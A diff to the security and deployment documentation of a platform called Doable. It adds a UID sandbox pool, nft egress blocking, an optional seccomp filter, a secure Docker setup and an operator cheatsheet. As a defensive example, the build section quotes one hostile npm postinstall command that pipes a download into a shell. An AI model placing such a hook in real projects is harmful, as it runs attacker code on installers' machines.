@@ -377,64 +377,88 @@ registries."
 the operator picks Squid, mitmproxy, or an existing corporate proxy.
 The allow-list configuration lives outside Doable's deploy flow.
 
-### Dev sandbox UID pool
+### Dev sandbox UID pool (auto-scaling)
 
 Production runtime (`doable-app@.service`) uses systemd's
-`DynamicUser=yes` for per-app isolation. The **dev preview server**
-that runs during a chat session is a separate jail, sandboxed via a
-**pre-allocated UID pool**:
+`DynamicUser=yes` for per-app isolation. The **dev preview server** AND
+the **build/publish job** for each project both run as a low-privilege
+Linux UID drawn from a single 55,000-slot pool (UIDs 10001..65000):
 
-- `setup-server.sh` creates 100 unprivileged users
-  (`doable-dev-1`..`doable-dev-100`, UIDs 10001..10100) at install time.
-- The API allocates a UID from the pool when a dev session starts
-  (`services/api/src/runtime/dev-uid-allocator.ts`) and releases it
-  when the session ends.
-- `services/api/src/projects/vite-jail.ts` wraps the dev spawn with
-  `setpriv --reuid <uid> --regid <uid> --clear-groups --` so the dev
-  process (next dev / vite / nuxi / fastapi / etc.) drops to that
-  UID before exec.
+- `setup-server.sh` pre-creates 1000 named users
+  (`doable-dev-1`..`doable-dev-1000`, UIDs 10001..11000) for `ps`
+  ergonomics and `id doable-dev-N` lookups. The allocator is free to
+  hand out **any UID up to 65000** without prior `useradd` — kernel
+  doesn't require a passwd entry for `setpriv --reuid` or `chown`.
+  Auto-scaling without ops intervention.
+- The API allocates a UID per project on dev start AND on build start
+  (`services/api/src/runtime/dev-uid-allocator.ts`). Allocation is
+  idempotent per `projectId` — dev and build for the same project
+  share the same UID, so chown doesn't fight ownership.
+- **Dev preview spawn** (`services/api/src/projects/vite-jail.ts`)
+  wraps with `setpriv --reuid <uid> --regid <uid> --clear-groups --`
+  so the dev process drops privileges before exec.
+- **Build/publish spawn** (`services/api/src/deploy/builder.ts`)
+  applies the **same** setpriv wrap. Closes the
+  malicious-postinstall-as-root vector — a hostile
+  `"postinstall": "curl evil.sh|sh"` in a user's `package.json` runs
+  as UID 10001+ with nft blocking egress, not as the API user.
 - `nft` table `inet doable_dev` blocks all egress for skuid range
-  `10001-10100` except loopback. Squid at `127.0.0.1:3128` proxies
+  `10001-65000` except loopback. Squid at `127.0.0.1:3128` proxies
   npm/PyPI traffic on the operator's allow-list; raw socket egress
   to the internet is dropped at the kernel.
 - Project directory ownership is `chown`'d to the acquired UID before
-  spawn, so the sandboxed process can read/write its own tree but
-  not sibling projects (chmod 0700) and not the API's `.env` (owned
-  by root / API user).
+  spawn (and again before build), so the sandboxed process can
+  read/write its own tree but not sibling projects (default chmod
+  prevents cross-project) and not the API's `.env` (owned by root).
 - stdout/stderr pipes are unchanged — log capture works exactly as
   before. No journalctl detour, no debuggability loss.
+
+**Pool exhaustion** (55,000 concurrent dev+build sessions on one host)
+is implausible — you'd hit memory/CPU limits long before then. If
+exhausted, the allocator returns null and the spawn site fails closed
+(refuses to run rather than silently dropping security).
 
 **Verify on the server:**
 
     id doable-dev-1                            # UID=10001
-    nft list table inet doable_dev             # shows skuid drop rule
+    id doable-dev-1000                         # UID=11000 (last named)
+    nft list table inet doable_dev             # shows skuid 10001-65000 drop
     systemctl is-enabled nftables              # enabled
     # During a live dev session for project X:
-    ps -o pid,uid,cmd $(pgrep -f "next dev")   # uid is in 10001..10100
+    ps -o pid,uid,cmd $(pgrep -f "next dev")   # uid is in 10001..65000
 
 This jail is **Linux-only**. Windows/Mac dev (the `dev.ps1` flow on a
 laptop) skips the setpriv path entirely — `shouldJail()` already
 short-circuits there.
 
-**Pool exhaustion**: with 100 slots, sessions beyond #100 fall back to
-spawning without setpriv (logged). In practice this is well above any
-single host's expected concurrency; bump `POOL_SIZE` in
-`dev-uid-allocator.ts` and re-run `setup-server.sh` if you need more.
+### Optional seccomp filter (`DOABLE_DEV_SECCOMP`)
+
+For environments that want syscall-level filtering on top of UID drop,
+set `DOABLE_DEV_SECCOMP=on`. The dev spawn becomes:
+
+    cgroup(systemd-run --scope SystemCallFilter=...(setpriv-uid-drop(next dev)))
+
+The `--scope` mode forwards stdout/stderr (no journalctl) so log
+capture still works. Filter denies `@debug @module @mount @raw-io
+@reboot @swap @privileged` syscalls plus `NoNewPrivileges=yes` and
+`RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6`.
+
+**Default off.** Turn on per environment when you need to harden against
+kernel-exploit escalation. May break weird debugger workflows
+(ptrace/strace/perf) — toggle off if you hit one.
 
 ### Honest gaps still open
 
 - **Workloads needing exotic kernel surface will fail.** If a
   workload needs raw sockets / `AF_NETLINK` / `SCHED_FIFO` it will
-  fail under the new `SystemCallFilter` /
+  fail under the production `SystemCallFilter` /
   `RestrictAddressFamilies` / `RestrictRealtime` — most web apps
-  don't need any of these, but a specialised app (network
-  diagnostics tooling, real-time audio, etc.) would have to opt out
-  of the relevant directive.
-- **Dev sandbox does not run a SystemCallFilter.** `setpriv` drops
-  privileges but doesn't install a seccomp filter. A kernel exploit
-  by a dev-time process could still escalate. Production runtime is
-  the right layer to demand more here; for dev, UID + nft is the
-  pragmatic high-leverage stop.
+  don't need any of these.
+- **Dev `DOABLE_DEV_SECCOMP=off` (default) does not install a seccomp
+  filter.** UID drop + nft + cgroup limits still apply. A kernel
+  exploit by a dev-time process could still escalate. Flip the env to
+  `on` for environments that need to close this gap (at the cost of
+  some debugger tooling).
 
 ---
 
@@ -536,13 +560,30 @@ want:
 
 `docker-compose.secure.yml` builds `docker/Dockerfile.secure` (an
 Ubuntu + systemd image) and runs the entire `setup-server.sh` flow on
-first boot inside the container — random `JWT_SECRET`,
-`ENCRYPTION_KEY`, `INTERNAL_SECRET`, per-project UID isolation under
-`DynamicUser=`, the dovault sandbox, and the build-time Squid proxy
-with the npm/PyPI allow-list. `DOABLE_HARDENING=full` is wired by
-default. In short: same security posture as a fresh
-`bash setup-server.sh` install on bare metal, just packaged as one
-container.
+first boot inside the container. **Same security posture as a fresh
+bare-metal `bash setup-server.sh` install** — every primitive provisions
+inside the container:
+
+- Random `JWT_SECRET`, `ENCRYPTION_KEY`, `INTERNAL_SECRET` generated
+  on first boot
+- 1000 named dev-sandbox users (`doable-dev-1..1000`) + numeric UID
+  range 10001..65000 ready for the allocator
+- `nft` table `inet doable_dev` blocking egress for skuid 10001-65000
+  except loopback (the `nftables` apt package is in the image; the
+  `--privileged` flag gives the container `CAP_NET_ADMIN`)
+- `setpriv` wrap on every dev preview AND build/publish spawn —
+  malicious npm postinstall scripts cannot run as root
+- `DynamicUser=yes` on per-project runtime units (production
+  `doable-app@.service`)
+- dovault sandbox + build-time Squid proxy + `BUILD_HTTP_PROXY`
+  pointing at `127.0.0.1:3128`
+- `DOABLE_HARDENING=full` wired by default, `RATE_LIMIT_MAX=0`
+  (Cloudflare upstream), `DEV_SERVER_IDLE_MS=900000` (15 min idle
+  evict), framework picker pinned to vite + nextjs
+
+Equivalent to bare metal in one container. Only thing the operator
+adds on top: the Cloudflare Tunnel credentials (mount the cert into
+`/etc/cloudflared/`) so the install is reachable from the internet.
 
 ### Quickstart
 
@@ -624,33 +665,92 @@ docker compose -f docker-compose.secure.yml down -v   # -v deletes the volume
 docker compose -f docker-compose.secure.yml up -d
 ```
 
-## 12. API rate limiting (Wave 31-D)
+## 12. API rate limiting
 
-The API server applies a global rate limit (default **200 requests per minute
-per authenticated user**, or per IP for unauthenticated requests). Exceeding
-the limit returns `429 Too Many Requests` with a `Retry-After` header.
+The API server applies an optional global rate limit. **Default: OFF**
+(`RATE_LIMIT_MAX=0`). Doable production runs behind Cloudflare Tunnel
+which already handles DDoS / bot protection upstream — the in-process
+limiter mostly punishes bursty legit users (OAuth flows, dashboard
+polls) without adding much defence.
 
 ### Configuration (env)
 
 | Env var | Default | Effect |
 |---|---|---|
-| `RATE_LIMIT_MAX` | `200` | Max requests per window per key. Set to **`0` to disable** the limiter entirely (use only when an upstream limiter — Cloudflare, nginx, ALB — is in front). |
+| `RATE_LIMIT_MAX` | `0` (off) | Max requests per window per key. Set to e.g. `200` to enable. Use a positive value when running on a host without an upstream CDN/limiter. |
 | `RATE_LIMIT_WINDOW_MS` | `60000` | Window length in ms. e.g. `300000` for a 5-minute sliding window. |
 
-Some routes are intentionally **exempt** from rate limiting:
+Some routes are **always exempt** regardless of `RATE_LIMIT_MAX`:
 
 | Path prefix | Why |
 |---|---|
 | `/health` | Liveness/readiness probes (Docker, K8s, monitoring) — must never throttle |
+| `/auth/*` | OAuth flows fire many subrequests per login (provider redirect → callback → token exchange → user info → frontend bounces) |
 | `/preview/*` | A single editor preview load triggers many subrequests (HTML + JS chunks + assets) |
-| `/thumbnails/*` | Dashboard polls these continuously while pages load |
-| `/analytics/*` | Telemetry beacons fire on every navigation |
+| `/thumbnails/*` | Dashboard polls these continuously |
+| `/analytics/*` | Telemetry beacons on every navigation |
 | `/admin/*` | Platform-admin views auto-refresh every 5s |
 | `/visual-edit-bridge.js` | Loaded inside every preview iframe |
 
-To change the limit, edit `services/api/src/index.ts` (search for `apiRateLimiter`).
-To change exemptions, edit the same file's `app.use("*", …)` block.
+Loopback (`127.0.0.1`, `::1`) connections also bypass; in non-production
+environments, requests without `X-Forwarded-For` bypass too (catches
+direct localhost dev traffic).
 
-Source: `services/api/src/middleware/rate-limit.ts`. The limiter uses the in-memory
-KV store by default (sufficient for ~100 concurrent users); set `REDIS_URL` for a
-shared limiter across multiple API instances.
+Source: `services/api/src/middleware/rate-limit.ts`. The limiter uses
+the in-memory KV store by default (sufficient for ~100 concurrent
+users); set `REDIS_URL` for a shared limiter across multiple API
+instances.
+
+---
+
+## 13. Operator levers — single-page cheatsheet
+
+Every knob below is wired to ship secure-by-default on a fresh
+`setup-server.sh` (or `docker-compose.secure.yml`) install. **You only
+edit `.env` if you want to deviate.** Idempotent re-runs preserve your
+overrides.
+
+### Security toggles
+
+| Env var | Default | When to flip |
+|---|---|---|
+| `DOABLE_HARDENING` | `full` | `relaxed` for debugger workflows on a dev droplet; `off` for raw spawn (debug only). Affects build, dev-server, and runtime layers in lockstep. |
+| `DOABLE_DEV_SECCOMP` | `off` | Turn `on` to add a kernel syscall deny-list to dev preview spawns. Closes kernel-exploit escalation at the cost of breaking ptrace/strace/perf workflows inside the sandbox. |
+| `RATE_LIMIT_MAX` | `0` (off) | Set to `200` (or any positive integer) on hosts without Cloudflare/nginx in front. |
+| `DOABLE_ENABLED_FRAMEWORKS` | `vite-react,nextjs-app` | Comma-separated framework ids. Re-enabling a deleted framework requires restoring its files from `~/Documents/doable-disabled-frameworks-backup-<date>/` first. |
+
+### Resource toggles
+
+| Env var | Default | Effect |
+|---|---|---|
+| `DEV_SERVER_IDLE_MS` | `900000` (15 min) | Idle dev preview gets killed after this duration with no proxy traffic. `0` disables eviction. |
+| `DEV_SERVER_SWEEP_INTERVAL_MS` | `300000` (5 min) | How often the eviction sweeper runs. |
+| `BUILD_MEMORY_MAX` | `1G` | Memory cap for `next build` / `vite build` / `pip install` cgroup. |
+| `BUILD_CPU_QUOTA` | `100%` | CPU cap for builds (one core). |
+| `VITE_MEMORY_MAX` | `256M` | Memory cap for dev preview cgroup. |
+| `VITE_CPU_QUOTA` | `50%` | CPU cap for dev preview (half core). |
+
+### Network toggles
+
+| Env var | Default | Effect |
+|---|---|---|
+| `BUILD_HTTP_PROXY` | unset | When set (e.g. `http://127.0.0.1:3128` Squid), npm/PyPI traffic during build routes through it. nft drops everything else for the sandbox UID range. |
+| `CORS_ORIGINS` | (empty) | Comma-separated list of additional origins allowed by CORS in production. localhost / 127.0.0.1 / `*.doable.me` are already allowed. |
+
+### Verifying everything ran (any host — bare metal OR Docker)
+
+```bash
+# Inside the host (or `docker exec doable bash` for Docker-secure):
+id doable-dev-1                      # → UID=10001
+id doable-dev-1000                   # → UID=11000 (last named)
+nft list table inet doable_dev       # → drop rule for skuid 10001-65000
+systemctl is-enabled nftables        # → enabled
+systemctl is-active doable-apps.target  # → active
+grep RATE_LIMIT_MAX /root/doable/.env   # → unset OR =0 (rate limit off)
+grep DOABLE_HARDENING /root/doable/.env # → =full
+# During a live dev session for project X:
+ps -o pid,uid,cmd $(pgrep -f "next dev")  # → uid in 10001..65000 range
+```
+
+If any of these don't match: `cd /root/doable && ./setup-server.sh`
+again (idempotent — won't break anything; reprovisions missing pieces).
